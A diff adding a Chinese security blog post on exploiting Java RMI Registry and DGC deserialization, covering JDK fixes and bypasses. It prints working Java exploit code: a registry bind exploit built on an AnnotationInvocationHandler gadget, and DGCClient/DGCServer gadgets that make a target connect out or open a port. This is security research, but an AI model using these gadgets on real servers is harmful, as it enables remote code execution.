@@ -175,6 +175,150 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/03/RegisteryAndDGC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ky0127">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/03/RegisteryAndDGC/" class="post-title-link" itemprop="url">Registry与DGC的攻击利用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-03 23:06:12 / Modified: 23:08:04" itemprop="dateCreated datePublished" datetime="2022-02-03T23:06:12+08:00">2022-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+
+
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Registry与DGC的攻击利用"><a href="#Registry与DGC的攻击利用" class="headerlink" title="Registry与DGC的攻击利用"></a>Registry与DGC的攻击利用</h1><p>在 WebLogic 反序列化漏洞的绕过方式中利用到了 RMI 方面的知识，加上对 RMI 方面的攻击不是很了解，就有了这篇文章。</p>
+<h1 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h1><p>Registry 指的是 RMI 的注册表，攻击的目标是注册表所在的机器，一般注册表和 RMI Server 在同一个机器上，特殊情况下也会在不同机器上。</p>
+<p>在我们通过 <code>LocateRegistry#getRegistry</code> 获取到目标开启的注册表之后，可以通过 <code>Registry#bind</code> 方法绑定一个对象到注册表上，而我们绑定的对象传送到目标机器上之后会对其进行一个反序列化。</p>
+<p>反序列化触发点在 <code>RegistryImpl_Skel#dispatch</code> 方法上。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203192225802.png" alt="image-20220203192225802"></p>
+<p>同样的，在获取到开启的注册表之后，可以通过 <code>rebind/lookup</code> 方法触发反序列化链，因为 <code>rebind/lookup</code> 方法传递对象过去之后目标也会对其进行反序列化。</p>
+<p>漏洞点同样发生在 <code>RegistryImpl_Skel#dispatch</code> 方法上，其实 <code>dispatch</code> 这个方法就是通过一个 <code>switch</code> 来判断是 <code>bind/lookup/rebind</code> 等操作中的哪个，对应的 <code>case</code> 为如下。</p>
+<table>
+<thead>
+<tr>
+<th align="center">0</th>
+<th align="center">1</th>
+<th align="center">2</th>
+<th align="center">3</th>
+<th align="center">4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">bind</td>
+<td align="center">list</td>
+<td align="center">lookup</td>
+<td align="center">rebind</td>
+<td align="center">unbind</td>
+</tr>
+</tbody></table>
+<p>可以看到 <code>rebind/lookup</code> 操作都会触发反序列化</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203193256536.png" alt="image-20220203193256536"></p>
+<p>（对于这里的调试分析可以参考后面列的文章</p>
+<h2 id="Registry修复"><a href="#Registry修复" class="headerlink" title="Registry修复"></a>Registry修复</h2><p>在 JDK8u232_b09 版本之前对 Registry 被攻击有两处修复，第一处修复是在 JDK8u121 之后对注册表可以反序列化的类进行了一个限制，是一个白名单的限制。实现限制的方法为 <code>RegistryImpl#registryFilter</code> 。（这里是 JEP290 的防御操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+<p>第二处修复是在 JDK8u141 之后，在 JDK8u141 之前 <code>bind/rebind/lookup</code> 都可以触发反序列化，但在此版本之后对 <code>bind/rebind</code> 的 case 语句块进行了修改，在反序列化前增加了一个检查，检查调用 <code>bind/rebind</code> 的机器是否为本地，限制了调用源只能是本地。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203193828166.png" alt="image-20220203193828166"></p>
+<p>其实在 JDK8u141 之前就已经存在这个 <code>checkAccess</code> 方法了，也就是这个限制调用源本来就存在，但是因为在反序列化之前没有调用这个方法进行检查，那么这个限制也就相当于没有。</p>
+<p>第三处修复在 JDK8u232_b09 之后，在处理 <code>bind/rebind/lookup</code> 方法的 <code>case</code> 语句块中如果反序列化时发生错误或者反序列化完成之后类型转换错误则会调用 <code>call#discardPendingRefs</code> 方法，将现存的 DGC 连接清除掉，也就无法使用下面的 DGCClient/DGCServer Gadget，见 <a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l1.40%EF%BC%88ps:%E6%AD%A4%E5%A4%84%E4%BB%A5%E5%8F%8A%E4%B8%8B%E9%9D%A2%E8%AF%B4%E7%9A%84">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l1.40（ps:此处以及下面说的</a> DGC 就是网上说的 JRMP）</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203220828437.png" alt="image-20220203220828437"></p>
+<h2 id="Registry绕过"><a href="#Registry绕过" class="headerlink" title="Registry绕过"></a>Registry绕过</h2><p>那么在 JDK8u141 之后怎么攻击利用 Registry 呢？调用源检查只限制了 <code>bind/rebind</code> 方法，对 <code>lookup</code> 方法没有进行限制，那么就可以用 <code>lookup</code> 方法进行触发反序列化链。</p>
+<p>对于第一个白名单限制，可以利用白名单里的 Remote 及实现此接口类以及子类构造 Gadget 进行利用，当然其它类如果能找到利用点也是可以的。</p>
+<h2 id="Registry攻击实现"><a href="#Registry攻击实现" class="headerlink" title="Registry攻击实现"></a>Registry攻击实现</h2><ol>
+<li>利用常规的 Gadget，实现执行任意命令等效果</li>
+<li>利用 DGCClient Gadget，此 Gadget 被反序列化后可以让目标连接我们架设好的恶意 DGC 服务器（此处的DGCClient 就相当于 ysoserial 的 payload/JRMPClient</li>
+<li>利用 DGCServer Gadget，此 Gadget 被反序列化后可以让目标在指定端口开启 DGC 服务（此处的DGCServer 就相当于 ysoserial 的 payload/JRMPListern</li>
+<li>利用注册表上可以调用的方法，使用恶意对象作为参数传递过去之后，目标会对恶意对象进行反序列化操作，此时触发Gadget</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIRegistryExploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Remote remote = (Remote) getObject();</span><br><span class="line">            <span class="comment">//Remote remote = (Remote) DGCClient.getObject();</span></span><br><span class="line">            <span class="comment">//Remote remote = (Remote) DGCServer.getObject();</span></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9999</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;ky0202&quot;</span>+System.nanoTime(),remote);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ParseArgs.parseArgs(args);</span><br><span class="line">        exploit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Hashtable hashtable = (Hashtable) Collections07.getObject();</span><br><span class="line">        <span class="comment">// hashtable 为 invocationHandler 的一个字段,那么反序列化的时候也会反序列化这个字段,进而触发 Gadget</span></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) Reflect.reflectGetObject(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>, <span class="keyword">new</span> Class[]&#123;Class.class, Map.class&#125;, <span class="keyword">new</span> Object[]&#123;Retention.class, hashtable&#125;);</span><br><span class="line">        <span class="comment">// 把 Remote 对象反序列化,因为 invocationHandler 为其一个字段,反序列化时会反序列化其字段,也就是调用 AnnotationInvocationHandler#readObject 方法触发 Gadget</span></span><br><span class="line">        Remote proxyRemote = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line">        <span class="keyword">return</span> proxyRemote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据 Gadget 修改获取的对象即可，这里使用的是 <code>bind</code> 触发，最好的方式是使用 <code>lookup</code> 触发，但是这里没有实现。</p>
+<p>DGCClient Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Gadget:</span></span><br><span class="line"><span class="comment"> *   RemoteObjectInvocationHandler#readObject</span></span><br><span class="line"><span class="comment"> *     RemoteObject#readObject</span></span><br><span class="line"><span class="comment"> *       UnicastRef#readExternal</span></span><br><span class="line"><span class="comment"> *         LiveRef#read</span></span><br><span class="line"><span class="comment"> *             DGCClient#registerRefs</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DGCClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        LiveRef liveRef = <span class="keyword">new</span> LiveRef(<span class="keyword">new</span> ObjID(<span class="number">0</span>),tcpEndpoint,<span class="keyword">false</span>);</span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(liveRef);</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        <span class="keyword">return</span> remoteObjectInvocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = (RemoteObjectInvocationHandler) getObject();</span><br><span class="line">        <span class="keyword">byte</span>[] serialize = SerWithUnSer.serialize(remoteObjectInvocationHandler);</span><br><span class="line">        SerWithUnSer.unSerialize(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>DGCServer Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Gadget:</span></span><br><span class="line"><span class="comment"> *   UnicastRemoteObject#readObject</span></span><br><span class="line"><span class="comment"> *     UnicastRemoteObject#reexport</span></span><br><span class="line"><span class="comment"> *       UnicastRemoteObject#exportObject</span></span><br><span class="line"><span class="comment"> *         UnicastRemoteObject#exportObject</span></span><br><span class="line"><span class="comment"> *           UnicastServerRef#exportObject</span></span><br><span class="line"><span class="comment"> *             LiveRef#exportObject</span></span><br><span class="line"><span class="comment"> *               TCPEndpoint#exportObject</span></span><br><span class="line"><span class="comment"> *                  TCPTransport#exportObject</span></span><br><span class="line"><span class="comment"> *                    TCPTransport#listen</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DGCServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Constructor constructor1 = RemoteObject.class.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;RemoteRef.class&#125;);</span><br><span class="line">        constructor1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Constructor constructor2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(ActivationGroupImpl.class, constructor1);</span><br><span class="line">        constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> UnicastServerRef(<span class="number">6666</span>)&#125;);</span><br><span class="line">        Reflect.reflectSetField(UnicastRemoteObject.class,unicastRemoteObject,<span class="string">&quot;port&quot;</span>, <span class="number">6666</span>);</span><br><span class="line">        <span class="keyword">return</span> unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) getObject();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = SerWithUnSer.serialize(unicastRemoteObject);</span><br><span class="line">        SerWithUnSer.unSerialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用注册表可以调用的方法，然后传递恶意对象进去，让目标对传递过去的恶意对象进行反序列化操作，这时即可触发 Gadget，反序列化触发点在 <code>UnicastServerRef#dispatch</code> 方法，这里遍历反序列化传递过来的参数，在 <code>unmarshalValue</code> 方法中存在反序列化操作</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203224612923.png" alt="image-20220203224612923"></p>
+<p>这里如果调用的方法可以传递任意对象或者存在 Gadget 的对象，就可以直接传递恶意对象进去，否则需要利用动态修改字节码的技术把恶意对象作为参数传递进去。（可以参考后面列的文章</p>
+<h1 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h1><p>前面通过利用 DGCClient/DGCServer Gadget 攻击 Registry 之后，可以使目标连接某一特定 DGC 服务器或者在指定端口开启一个 DGC 服务，这时可以进一步利用。</p>
+<p>在用 DGCClient Gadget 攻击成功目标之后，目标会去连接指定的 DGC 服务器，这时候我们可以架设一台恶意 DGC 服务器，让目标连接我们服务器的时候，返回一个恶意对象，这时候目标会对返回的对象进行反序列化，此时触发 Gadget（因为 DGC 通信过程中都是序列化的形式进行的，所以不管是客户端还是服务端都存在反序列化的点，这里的架设恶意 DGC 服务器利用 ysoserial 的 exploit/JRMPListern 即可</p>
+<p>反序列化触发点在 <code>StreamRemoteCall#executeCall</code> 方法上</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203222216993.png" alt="image-20220203222216993"></p>
+<p>在用 DGCServer Gadget 攻击  Registry 之后，目标会在指定端口开启一个 DGC 服务，这时可以架设一个恶意的 DGC 客户端去连接目标开启的 DGC 服务，并连接之后发送恶意对象，这时候目标会对客户端发送的恶意对象进行反序列化，此时触发 Gadget ，搭建 DGC 客户端使用 ysoserial 的 exploit/JRMPClient 即可</p>
+<p>反序列化触发点在 <code>DGCImpl_Skel#dispatch</code> 方法上</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203223010117.png" alt="image-20220203223010117"></p>
+<h2 id="DGC修复"><a href="#DGC修复" class="headerlink" title="DGC修复"></a>DGC修复</h2><p>在 JDK8u232_b09 之后，在 <code>DGCImpl_Stub#dirty</code> 方法上设置了反序列化的白名单，而 <code>dirty</code> 方法是 <code>StreamRemoteCall#executeCall</code> 方法的必经之路，所以这也就阻断 <code>executeCall</code>方法反序列化恶意对象了。见 <a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l4.50">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l4.50</a></p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220203223504425.png" alt="image-20220203223504425"></p>
+<p>在 JDK8u121 之后对 DGCServer 可以反序列化的类进行了一个白名单的限制，限制的方法在 <code>DGCImpl#checkInput</code> （这里就是 JEP290 的限制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> var2 != ObjID.class &amp;&amp; var2 != UID.class &amp;&amp; var2 != VMID.class &amp;&amp; var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2223">https://xz.aliyun.com/t/2223</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qsort_/article/details/104814905">https://blog.csdn.net/qsort_/article/details/104814905</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qsort_/article/details/104969138">https://blog.csdn.net/qsort_/article/details/104969138</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qsort_/article/details/104874111">https://blog.csdn.net/qsort_/article/details/104874111</a><br><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l1.40">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l1.40</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/29/CVE20160638andCVE20163510/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -623,7 +767,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
